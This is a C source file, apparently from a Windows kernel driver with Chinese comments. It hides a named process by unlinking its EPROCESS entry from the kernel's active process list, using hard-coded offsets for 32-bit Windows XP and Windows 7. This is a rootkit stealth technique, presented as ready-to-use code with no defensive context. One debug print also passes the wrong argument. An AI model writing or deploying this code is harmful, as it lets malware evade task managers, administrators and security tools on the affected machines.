#pragma once
#include "process.h"

ULONG_PTR ActiveOffsetPre = 0;
ULONG_PTR ActiveOffsetNext = 0;
ULONG_PTR ImageName = 0;


//************************************
// Method:    SetActiveOff
// FullName:  SetActiveOff
// Access:    public 
// Returns:   VOID
// Qualifier: 设置不同系统版本EPROCESS的
//            ActiveProcessList字段和ImageFileName字段偏移
//************************************
VOID SetActiveOff() {
	WIN_VERSION winversion = GetWindowsVersion();
	switch (winversion)
	{
	case WINDOWS_XP:   //32Bits
	{
		ActiveOffsetPre = 0x8c;
		ActiveOffsetNext = 0x88;
		ImageName = 0x174;
		break;
	}

	case WINDOWS_7:   //32Bits 
	{
		ActiveOffsetPre = 0xbc;
		ActiveOffsetNext = 0xb8;
		ImageName = 0x16c;
		break;
	}
	default:
		break;
	}
}


//************************************
// Method:    HideProcess
// FullName:  HideProcess
// Access:    public 
// Returns:   VOID
// Qualifier: 隐藏指定进程名
// Parameter: char * ProcessName
//************************************
VOID HideProcess(char* ProcessName)
{
	PEPROCESS EProcessCurrent = NULL;
	PEPROCESS EProcessPre = NULL;
	PLIST_ENTRY Temp = NULL;


	SetActiveOff();
	EProcessCurrent = PsGetCurrentProcess();

	EProcessPre = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)EProcessCurrent + ActiveOffsetPre))) - ActiveOffsetNext);

	while (EProcessCurrent != EProcessPre)
	{
		DbgPrint("%s\r\n", (char*)((ULONG_PTR)EProcessCurrent + ImageName));
		if (strcmp((char*)((ULONG_PTR)EProcessCurrent + ImageName), ProcessName) == 0)
		{
			Temp = (PLIST_ENTRY)((ULONG_PTR)EProcessCurrent + ActiveOffsetNext);
			if (MmIsAddressValid(Temp))
			{
				RemoveEntryList(Temp);
				DbgPrint("%s\r\n", &ProcessName);
			}
			break;
		}
		EProcessCurrent = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)EProcessCurrent + ActiveOffsetNext))) - ActiveOffsetNext);
	}
}